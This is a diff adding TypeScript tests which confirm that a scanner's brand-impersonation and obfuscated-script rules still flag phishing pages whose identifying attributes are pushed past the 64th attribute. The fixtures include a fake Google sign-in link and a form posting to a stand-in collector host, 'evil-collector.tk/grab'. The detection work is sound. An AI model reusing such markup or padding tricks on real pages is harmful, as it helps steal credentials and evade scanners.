@@ -1308,3 +1308,35 @@ describe("integrity/template-discontinuity: capped crawls", () => {
     expect(parsed.minBaselinePagesWhenCapped).toBe(20);
   });
 });
+
+
+// ── Attributes past the 64th are still read (#1462): padding a control with junk attributes is not a way past the rules ─────────
+
+describe("a credential control with its attributes pushed past the 64th", () => {
+  const junk = (n: number) => Array.from({ length: n }, (_, i) => `d${i}="v"`).join(" ");
+  const kitWith = (link: string) =>
+    kitPageHtml().replace('<a href="https://accounts-google.tk/oauth">Sign in with Google</a>', link);
+
+  test("the kit page stays a fail with the credential link's href at the 64th, 65th, 101st and 4,000th attribute", () => {
+    for (const n of [63, 64, 65, 101, 4_000]) {
+      const html = kitWith(`<a ${junk(n)} href="https://accounts-google.tk/oauth">Sign in with Google</a>`);
+      const brand = find(run(brandImpersonationRule, pageCtx(`${SITE}/calendly`, html)), "brand-impersonation");
+      expect([n, brand?.status, brand?.details?.escalated]).toEqual([n, "fail", true]);
+      const obf = find(run(obfuscatedScriptRule, pageCtx(`${SITE}/calendly`, html)), "obfuscated-script");
+      expect([n, obf?.status]).toEqual([n, "fail"]);
+    }
+  });
+
+  test("an off-site link labelled only by an aria-label at the 70th attribute is a finding", () => {
+    const html = `<!doctype html><html><head><title>Fixture</title></head><body><main><a href="https://accounts-google.tk/oauth" ${junk(69)} aria-label="Sign in with Google"><svg></svg></a></main></body></html>`;
+    expect(detectBrandImpersonation(pageCtx(`${SITE}/x`, html))?.brand).toBe("Google");
+  });
+
+  test("an input submit with its value, and an input image with its alt, past the 64th attribute in an off-site form", () => {
+    const form = (input: string) =>
+      `<!doctype html><html><head><title>Fixture</title></head><body><main><form action="https://evil-collector.tk/grab" method="post">${input}</form></main></body></html>`;
+    for (const input of [`<input type="submit" ${junk(70)} value="Sign in with Google">`, `<input type="image" ${junk(70)} alt="Sign in with Google" src="/g.png">`]) {
+      expect([input.slice(0, 30), detectBrandImpersonation(pageCtx(`${SITE}/x`, form(input)))?.brand]).toEqual([input.slice(0, 30), "Google"]);
+    }
+  });
+});
